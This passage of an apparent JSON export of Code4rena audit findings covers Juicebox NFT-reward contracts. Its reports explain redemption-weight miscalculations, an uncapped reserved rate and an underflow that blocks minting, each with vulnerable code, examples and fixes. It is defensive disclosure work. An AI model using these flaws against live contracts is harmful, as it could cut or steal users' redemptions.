"2022-10-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L1224-L1259 https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L566 https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/abstract/JB721Delegate.sol#L142   # Vulnerability details  If the reserved rate of a tier is set to a value > `JBConstants.MAX_RESERVED_RATE`, the `JBTiered721DelegateStore._numberOfReservedTokensOutstandingFor` function will return way more outstanding reserved tokens (up to ~6 times more than allowed - **2^16 - 1** due to the manual cast of `reservedRate` to `uint16` divided by `JBConstants.MAX_RESERVED_RATE = 10_000`). This inflated value is used in the `JBTiered721DelegateStore.totalRedemptionWeight` function to calculate the cumulative redemption weight of all tokens across all tiers.  This higher-than-expected redemption weight will lower the `reclaimAmount` calculated in the `JB721Delegate.redeemParams` function. Depending on the values of `_data.overflow` and `_redemptionWeight`, the calculated `reclaimAmount` can be **0** (due to rounding down, [see here](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/abstract/JB721Delegate.sol#L142)) or a smaller than anticipated value, leading to burned NFT tokens from the user and no redemptions.  ## Impact  The owner of an NFT contract can add tiers with higher than usual reserved rates (and mint an appropriate number of NFTs to bypass all conditions in the `JBTiered721DelegateStore._numberOfReservedTokensOutstandingFor`), which will lead to a lower-than-expected redemption amount for users.  ## Proof of Concept  [JBTiered721DelegateStore.\\_numberOfReservedTokensOutstandingFor](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L1224-L1259)  ```solidity function _numberOfReservedTokensOutstandingFor(   address _nft,   uint256 _tierId,   JBStored721Tier memory _storedTier ) internal view returns (uint256) {   // Invalid tier or no reserved rate?   if (_storedTier.initialQuantity == 0 || _storedTier.reservedRate == 0) return 0;    // No token minted yet? Round up to 1.   if (_storedTier.initialQuantity == _storedTier.remainingQuantity) return 1;    // The number of reserved tokens of the tier already minted.   uint256 _reserveTokensMinted = numberOfReservesMintedFor[_nft][_tierId];    // If only the reserved token (from the rounding up) has been minted so far, return 0.   if (_storedTier.initialQuantity - _reserveTokensMinted == _storedTier.remainingQuantity)     return 0;    // Get a reference to the number of tokens already minted in the tier, not counting reserves or burned tokens.   uint256 _numberOfNonReservesMinted = _storedTier.initialQuantity -     _storedTier.remainingQuantity -     _reserveTokensMinted;    // Store the numerator common to the next two calculations.   uint256 _numerator = uint256(_numberOfNonReservesMinted * _storedTier.reservedRate);    // Get the number of reserved tokens mintable given the number of non reserved tokens minted. This will round down.   uint256 _numberReservedTokensMintable = _numerator / JBConstants.MAX_RESERVED_RATE;    // Round up.   if (_numerator - JBConstants.MAX_RESERVED_RATE * _numberReservedTokensMintable > 0)     ++_numberReservedTokensMintable;    // Return the difference between the amount mintable and the amount already minted.   return _numberReservedTokensMintable - _reserveTokensMinted; } ```  [JBTiered721DelegateStore.totalRedemptionWeight](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L566)  The `JBTiered721DelegateStore._numberOfReservedTokensOutstandingFor` function is called from within the `JBTiered721DelegateStore.totalRedemptionWeight` function. This allows for inflating the total redemption weight.  ```solidity function totalRedemptionWeight(address _nft) public view override returns (uint256 weight) {   // Keep a reference to the greatest tier ID.   uint256 _maxTierId = maxTierIdOf[_nft];    // Keep a reference to the tier being iterated on.   JBStored721Tier memory _storedTier;    // Add each token's tier's contribution floor to the weight.   for (uint256 _i; _i < _maxTierId; ) {     // Keep a reference to the stored tier.     _storedTier = _storedTierOf[_nft][_i + 1];      // Add the tier's contribution floor multiplied by the quantity minted.     weight +=       (_storedTier.contributionFloor *         (_storedTier.initialQuantity - _storedTier.remainingQuantity)) +       _numberOfReservedTokensOutstandingFor(_nft, _i, _storedTier);      unchecked {       ++_i;     }   } } ```  [JBTiered721Delegate.\\_totalRedemptionWeight](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721Delegate.sol#L712)  `JBTiered721DelegateStore.totalRedemptionWeight` is called in the `JBTiered721Delegate._totalRedemptionWeight` function.  ```solidity function _totalRedemptionWeight() internal view virtual override returns (uint256) {   return store.totalRedemptionWeight(address(this)); } ```  [abstract/JB721Delegate.redeemParams](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/abstract/JB721Delegate.sol#L139)  This `JBTiered721Delegate._totalRedemptionWeight` function is then called in the `JB721Delegate.redeemParams` function, which ultimately calculates the `reclaimAmount` given an overflow and `_decodedTokenIds`.  `uint256 _base = PRBMath.mulDiv(_data.overflow, _redemptionWeight, _total);` in [line 142](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/abstract/JB721Delegate.sol#L142) will lead to a lower `_base` due to the inflated denumerator `_total`.  ```solidity function redeemParams(JBRedeemParamsData calldata _data)   external   view   override   returns (     uint256 reclaimAmount,     string memory memo,     JBRedemptionDelegateAllocation[] memory delegateAllocations   ) {   // Make sure fungible project tokens aren't being redeemed too.   if (_data.tokenCount > 0) revert UNEXPECTED_TOKEN_REDEEMED();    // Check the 4 bytes interfaceId and handle the case where the metadata was not intended for this contract   if (     _data.metadata.length < 4 || bytes4(_data.metadata[0:4]) != type(IJB721Delegate).interfaceId   ) {     revert INVALID_REDEMPTION_METADATA();   }    // Set the only delegate allocation to be a callback to this contract.   delegateAllocations = new JBRedemptionDelegateAllocation[](1);   delegateAllocations[0] = JBRedemptionDelegateAllocation(this, 0);    // If redemption rate is 0, nothing can be reclaimed from the treasury   if (_data.redemptionRate == 0) return (0, _data.memo, delegateAllocations);    // Decode the metadata   (, uint256[] memory _decodedTokenIds) = abi.decode(_data.metadata, (bytes4, uint256[]));    // Get a reference to the redemption rate of the provided tokens.   uint256 _redemptionWeight = _redemptionWeightOf(_decodedTokenIds);    // Get a reference to the total redemption weight.   uint256 _total = _totalRedemptionWeight(); // @audit-info Uses the inflated total redemption weight    // Get a reference to the linear proportion.   uint256 _base = PRBMath.mulDiv(_data.overflow, _redemptionWeight, _total);    // These conditions are all part of the same curve. Edge conditions are separated because fewer operation are necessary.   if (_data.redemptionRate == JBConstants.MAX_REDEMPTION_RATE)     return (_base, _data.memo, delegateAllocations);    // Return the weighted overflow, and this contract as the delegate so that tokens can be deleted.   return (     PRBMath.mulDiv(       _base,       _data.redemptionRate +         PRBMath.mulDiv(           _redemptionWeight,           JBConstants.MAX_REDEMPTION_RATE - _data.redemptionRate,           _total         ),       JBConstants.MAX_REDEMPTION_RATE     ),     _data.memo,     delegateAllocations   ); } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider validating the tier reserved rate `reservedRate` in the `JBTiered721DelegateStore.recordAddTiers` function to ensure the reserved rate is not greater than `JBConstants.MAX_RESERVED_RATE`. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/199", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-30"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/198", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "grade-a", "selected for report", "Q-41"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/197", "labels": ["bug", "G (Gas Optimization)", "high quality report", "grade-a", "G-29"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/196", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-40"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/195", "labels": ["bug", "G (Gas Optimization)", "high quality report", "grade-b", "G-28"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Redemption weight of tiered NFTs miscalculates, making users redeem incorrect amounts - Bug #1", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/193", "labels": ["bug", "3 (High Risk)", "primary issue", "sponsor confirmed", "selected for report", "H-05"], "target": "2022-10-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L566   # Vulnerability details  ## Description  Redemption weight is a concept used in Juicebox to determine investor's eligible percentage of the non-locked funds. In redeemParams, JB721Delegate calculates user's share using:  ``` uint256 _redemptionWeight = _redemptionWeightOf(_decodedTokenIds); uint256 _total = _totalRedemptionWeight(); uint256 _base = PRBMath.mulDiv(_data.overflow, _redemptionWeight, _total); ```  _totalRedemptionWeight eventually is implemented in DelegateStore:  ``` for (uint256 _i; _i < _maxTierId; ) {   // Keep a reference to the stored tier.   _storedTier = _storedTierOf[_nft][_i + 1];   // Add the tier's contribution floor multiplied by the quantity minted.   weight +=     (_storedTier.contributionFloor *       (_storedTier.initialQuantity - _storedTier.remainingQuantity)) +     _numberOfReservedTokensOutstandingFor(_nft, _i, _storedTier);   unchecked {     ++_i;   } } ```  If we pay attention to _numberOfReservedTokensOutstandingFor() call, we can see it is called with tierId = i, yet storedTier of i+1. It is definitely not the intention as for example, recordMintReservesFor() uses the function correctly:  ``` function recordMintReservesFor(uint256 _tierId, uint256 _count)   external   override   returns (uint256[] memory tokenIds) {   // Get a reference to the tier.   JBStored721Tier storage _storedTier = _storedTierOf[msg.sender][_tierId];   // Get a reference to the number of reserved tokens mintable for the tier.   uint256 _numberOfReservedTokensOutstanding = _numberOfReservedTokensOutstandingFor(     msg.sender,     _tierId,     _storedTier   );   ... ```  The impact of this bug is incorrect calculation of the weight of user's contributions. The\u00a0`initialQuantity` and\u00a0`remainingQuantity` values are taken from the correct tier, but\u00a0`_reserveTokensMinted` minted is taken from previous tier. In the case where\u00a0`_reserveTokensMinted` is smaller than correct value, for example tierID=0 which is empty, the outstanding value returned is larger, meaning weight is larger and redemptions are worth less. In the opposite case, where lower tierID has higher `_reserveTokensMinted`, the redemptions will receive\u00a0*more* payout than they should.  ## Impact  Users of projects can receive less or more funds than they are eligible for when redeeming NFT rewards.  ## Proof of Concept  1\\. Suppose we have a project with 2 tiers, reserve ratio = 50%, redemption ratio = 100%:  |     |     |     |     |     |     | | --- | --- | --- | --- | --- | --- | | Tier | Contribution | Initial quantity | Remaining quantity | Reserves minted | Reserves outstanding | | Tier 1 | 50  | 10  | 3   | 1   | 2   | | Tier 2 | 100 | 30  | 2   | 8   | 2   |  When calculating totalRedemptionWeight(), the correct result is  50 * (10 - 3) + 2 + 100 * (30-2) + 2 = 3154  The wrong result will be:  50 * (10 -3) + **4** \\+ 100 * (30-2) + **13**\u00a0 = 3167  Therefore, when users redeem NFT rewards, they will get less value than they are eligible for. Note that totalRedemptionWeight() has an\u00a0*additional* bug where the reserve amount is not multiplied by the contribution, which is discussed in another submission. If it would be calculated correctly, the correct weight would be 3450.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Change the calculation to:  ``` _numberOfReservedTokensOutstandingFor(_nft, _i+1, _storedTier); ```  ## Additional discussion  Likelihood of impact is very high, because the conditions will arise naturally (different tiers, different reserve minted count for each tier, user calls redeem).\u00a0 Severity of impact is high because users receive less or more tokens than they are eligible for.  Initially I thought this bug could allow attacker to steal entire unlocked project funds, using a mint/burn loop. However, this would not be profitable because their calculated share of the funds would always be at most what they put in, because reserve tokens are printed out of thin air."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/192", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-27"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Reserved token rounding can be abused to honeypot and steal user's funds", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/191", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged", "upgraded by judge", "satisfactory", "selected for report", "H-04"], "target": "2022-10-juicebox-findings", "body": "Reserved token rounding can be abused to honeypot and steal user's funds"}, {"title": "Deactivated tiers can still mint reserve tokens, even if no non-reserve tokens were minted.\u00a0", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/189", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged", "satisfactory", "selected for report", "M-07"], "target": "2022-10-juicebox-findings", "body": "Deactivated tiers can still mint reserve tokens, even if no non-reserve tokens were minted.\u00a0"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/188", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-39"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/180", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-38"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/179", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-37"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/178", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-26"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Deploying a delegate with incomplete bytecode", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/172", "labels": ["bug", "disagree with severity", "downgraded by judge", "QA (Quality Assurance)", "grade-a", "Q-36"], "target": "2022-10-juicebox-findings", "body": "Deploying a delegate with incomplete bytecode"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/167", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-35"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/165", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-34"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/164", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-25"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Beneficiary credit balance can unwillingly be used to mint low tier NFT ", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/160", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged", "satisfactory", "selected for report", "M-06"], "target": "2022-10-juicebox-findings", "body": "Beneficiary credit balance can unwillingly be used to mint low tier NFT "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/158", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-a", "G-24"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/154", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-23"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/153", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-33"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/152", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-32"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/151", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-31"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/150", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-22"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/149", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-21"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/148", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-20"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/146", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-19"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/144", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-30"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/143", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-18"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/141", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-17"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/139", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-29"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/137", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-16"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Delegate contracts ownership can be lost to Deployer.", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/135", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-28"], "target": "2022-10-juicebox-findings", "body": "Delegate contracts ownership can be lost to Deployer."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/134", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-27"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/133", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "G-15"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/131", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-14"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Outstanding reserved tokens are incorrectly counted in total redemption weight", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/129", "labels": ["bug", "3 (High Risk)", "high quality report", "primary issue", "sponsor confirmed", "upgraded by judge", "selected for report", "H-03"], "target": "2022-10-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L563-L566   # Vulnerability details  ## Impact The amounts redeemed in overflow redemption can be calculated incorrectly due to incorrect accounting of the outstanding number of reserved tokens. ## Proof of Concept Project contributors are allowed to redeem their NFT tokens for a portion of the overflow (excessive funded amounts). The amount a contributor receives is calculated as [overflow * (user's redemption rate / total redemption weight)](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/abstract/JB721Delegate.sol#L135-L142), where user's redemption weight is [the total contribution floor of all their NFTs](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L532-L539) and total redemption weight is [the total contribution floor of all minted NFTs](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L563-L566). Since the total redemption weight is the sum of individual contributor redemption weights, the amount they can redeem is proportional to their contribution.  However, the total redemption weight calculation incorrectly accounts outstanding reserved tokens ([JBTiered721DelegateStore.sol#L563-L566](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L563-L566)): ```solidity // Add the tier's contribution floor multiplied by the quantity minted. weight +=   (_storedTier.contributionFloor *     (_storedTier.initialQuantity - _storedTier.remainingQuantity)) +   _numberOfReservedTokensOutstandingFor(_nft, _i, _storedTier); ``` Specifically, the *number* of reserved tokens is added to the *weight* of minted tokens. This disrupts the redemption amount calculation formula since the total redemption weight is in fact not the sum of individual contributor redemption weights. ## Tools Used Manual review ## Recommended Mitigation Steps Two options can be seen: 1. if the outstanding number of reserved tokens is considered minted (which seems to be so, judging by [this logic](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L1058-L1063)) then it needs to be added to the quantity, i.e.:     ```diff     --- a/contracts/JBTiered721DelegateStore.sol     +++ b/contracts/JBTiered721DelegateStore.sol     @@ -562,8 +562,7 @@ contract JBTiered721DelegateStore is IJBTiered721DelegateStore {           // Add the tier's contribution floor multiplied by the quantity minted.           weight +=             (_storedTier.contributionFloor *     -          (_storedTier.initialQuantity - _storedTier.remainingQuantity)) +     -        _numberOfReservedTokensOutstandingFor(_nft, _i, _storedTier);     +          (_storedTier.initialQuantity - _storedTier.remainingQuantity +     +           _numberOfReservedTokensOutstandingFor(_nft, _i, _storedTier)));            unchecked {             ++_i;     ``` 1. if it's not considered minted, then it shouldn't be counted at all."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/128", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-13"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/126", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-12"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "NFT not minted when contributed via a supported payment terminal", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/124", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "sponsor disputed", "selected for report", "M-05"], "target": "2022-10-juicebox-findings", "body": "NFT not minted when contributed via a supported payment terminal"}, {"title": "Project owner can steal overflow from contributors", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/123", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "sponsor disputed", "grade-b", "Q-26"], "target": "2022-10-juicebox-findings", "body": "Project owner can steal overflow from contributors"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/120", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-25"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/118", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-11"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Minting and redeeming will break for fully minted tiers with reserveRate != 0 and reserveRate/MaxReserveRate tokens burned", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/113", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "satisfactory", "edited-by-warden", "selected for report", "H-02"], "target": "2022-10-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L1224-L1259   # Vulnerability details  ## Impact  Minting and redeeming become impossible  ## Proof of Concept      uint256 _numberOfNonReservesMinted = _storedTier.initialQuantity -       _storedTier.remainingQuantity -       _reserveTokensMinted;      uint256 _numerator = uint256(_numberOfNonReservesMinted * _storedTier.reservedRate);      uint256 _numberReservedTokensMintable = _numerator / JBConstants.MAX_RESERVED_RATE;      if (_numerator - JBConstants.MAX_RESERVED_RATE * _numberReservedTokensMintable > 0)       ++_numberReservedTokensMintable;      return _numberReservedTokensMintable - _reserveTokensMinted;  The lines above are taken from JBTiered721DelegateStore#_numberOfReservedTokensOutstandingFor and used to calculate and return the available number of reserve tokens that can be minted. Since the return statement doesn't check that _numberReservedTokensMintable >= _reserveTokensMinted, it will revert under those circumstances. The issue is that there are legitimate circumstances in which this becomes false. If a tier is fully minted then all reserve tokens are mintable. When the tier begins to redeem, _numberReservedTokensMintable will fall under _reserveTokensMinted, permanently breaking minting and redeeming. Minting is broken because all mint functions directly call _numberOfReservedTokensOutstandingFor. Redeeming is broken because the redeem callback (JB721Delegate#redeemParams) calls _totalRedemtionWeight which calls _numberOfReservedTokensOutstandingFor.   Example:  A tier has a reserveRate of 100 (1/100 tokens reserved) and an initialQuantity of 10000. We assume that the tier has been fully minted, that is, _reserveTokensMinted is 100 and remainingQuantity = 0. Now we begin burning the tokens. Let's run through the lines above after 100 tokens have been burned (remainingQuantity = 100):  _numberOfNonReservedMinted = 10000 - 100 - 100 = 9800  _numerator = 9800 * 100 = 980000  _numberReservedTokensMintable = 980000 / 10000 = 98  Since _numberReservedTokensMintable < _reserveTokensMinted the line will underflow and revert.  JBTiered721DelegateStore#_numberOfReservedTokensOutstandingFor will now revert every time it is called. This affects all minting functions as well as totalRedemptionWeight. Since those functions now revert when called, it is impossible to mint or redeem anymore NFTs.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Add a check before returning:      +   if (_reserveTokensMinted > _numberReservedTokensMintable) {     +       return 0;     +   }          return _numberReservedTokensMintable - _reserveTokensMinted;"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/112", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-24"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/111", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-23"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/109", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-22"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/107", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-10"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/104", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-21"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/103", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-20"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/100", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-09"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/99", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-19"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/94", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-18"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/91", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-17"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/89", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-08"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/88", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-16"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/87", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-15"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/85", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-14"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Events with wrong argument order", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/80", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-13"], "target": "2022-10-juicebox-findings", "body": "Events 